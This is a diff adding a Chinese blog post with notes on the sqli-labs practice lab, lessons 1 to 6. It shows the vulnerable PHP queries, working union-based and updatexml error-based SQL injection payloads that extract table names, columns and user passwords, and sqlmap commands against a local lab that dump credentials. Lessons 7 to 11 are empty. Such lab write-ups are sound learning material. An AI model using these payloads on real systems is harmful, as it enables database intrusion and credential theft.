@@ -493,7 +493,128 @@
   <entry>
     <title>sqli-lab1</title>
     <url>/posts/2b9109b5/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<p><code>union select 1,2,table_name from information_schema.tables where table_schema = database() limit 0,1 </code>查字段</p>
+<p><code>union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39; limit 0,1</code></p>
+<p>1.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>用<code>&#39;</code>闭合</p>
+<p><code>id = 1&#39; --+</code></p>
+<p><code>id =1&#39; order by 4 --+</code> #报错 说明有三个字段</p>
+<p><code>id = 1.9999&#39; and union select 1,2,3  --+ </code>  2,3是输出点</p>
+<p><code>id=1.9999&#39; and union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1 --+</code>查表名</p>
+<p><code>id=-1&#39; union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 1,1--+</code> 查字段</p>
+<p><code>?id=-1&#39; union select 1,username,password from users limit 1,1--+</code> 查账号密码</p>
+<p>SQLmap</p>
+<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --dbs --batch --tables</code></p>
+<p>加了<code>--batch</code> sqlmap不会询问你输入 全部默认确定</p>
+<p>2.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<p><code>id=1 and 1=1 union select 1,2, table_name from information_schema.tables where table_schema=database() limit 1,1 --+</code> 查表名</p>
+<p><code>id=1 and 1=1 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1--+</code> 查字段</p>
+<br/>
+
+<p>SQLmap</p>
+<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-2/?id=1&quot; --dbs --batch --tables</code></p>
+<br/>
+
+<br/>
+
+<p>3.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>用<code>&#39;)</code>闭合</p>
+<p><code>id=1&#39;) and 1=1 --+</code></p>
+<p><code>id=1.999&#39;)  and 1=1 union select 1,2,table_name from information_schema.tables where table_schema=database() limit 1,1 --+</code></p>
+<p><code>id=1.999&#39;)  and 1=1 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1 --+</code></p>
+<p>SQLmap</p>
+<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-3/?id=1&quot; --dbs --batch</code></p>
+<br/>
+
+<p>4.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>用<code>&quot;)</code>闭合</p>
+<p>SQLmap</p>
+<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --dbs --batch</code></p>
+<br/>
+
+<p>5.</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>id=1&#39; --+</code>页面正常 说明用 <code>&#39;</code>闭合</p>
+<p><code>id=1&#39;  and 1=1 --+</code> 有回显</p>
+<p><code>id=1&#39;  and 1=2 --+</code>无回显</p>
+<p>查看代码，发现只要语句执行成功就会返回’You are in ……..’</p>
+<p>可以考虑使用报错注入或者布尔盲注</p>
+<p>报错注入使用<code>updatexml</code></p>
+<p><code>id=1&#39;  and updatexml(1,concat(0x7e,(select concat_ws(&#39;:&#39;,database(),version(),user()))),1)--+</code>==&gt; <code>XPATH syntax error: &#39;~security:5.7.26:root@localhost&#39;</code>得到数据库等信息</p>
+<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; ),0x7e),1)--+</code>得到表名==&gt; <code>XPATH syntax error: &#39;~emails,referers,uagents,users~&#39;</code></p>
+<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1)--+</code>得到字段名==&gt;<code> XPATH syntax error: &#39;~id,username,password~&#39;</code></p>
+<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)--+</code>查账号密码</p>
+<br/>
+
+<p>SQLmap</p>
+<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;</code>  #判断是否存在注入</p>
+<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  --dbs</code>   #获取数据库信息</p>
+<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security --tables</code> #获取表名</p>
+<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security -T users --columns</code>#获取字段名</p>
+<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security -T users -C username,password --dump</code> #获取账号密码</p>
+<br/>
+
+<br/>
+
+<p>6.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;3&quot;  color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用<code>&quot;</code>闭合</p>
+<p>显错注入</p>
+<p><code>id=1&quot; --+</code></p>
+<p><code>id=1&quot; and 1=1 --+</code></p>
+<p><code>id=1&quot; and 1=2 --+</code></p>
+<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select database()),0x7e)),1) --+</code> 查数据库名 ==&gt;<code>XPATH syntax error: &#39;~security~&#39;</code></p>
+<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)),1) --+</code> 查表名</p>
+<p><code>id=1&quot; and updatexml(1,(concat(0x7e,(select column_name from information_schema.columns where table_schema=database()  and table_name=&#39;users&#39; limit 0,1),0x7e)),1) --+</code> 查字段</p>
+<br/>
+
+<p>7.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<br/>
+
+<p>8.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<br/>
+
+<p>9.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<p>10.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<br/>
+
+<p>11.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>SQLi</category>
+      </categories>
+      <tags>
+        <tag>SQLi</tag>
+      </tags>
   </entry>
   <entry>
     <title>xss-labs1</title>
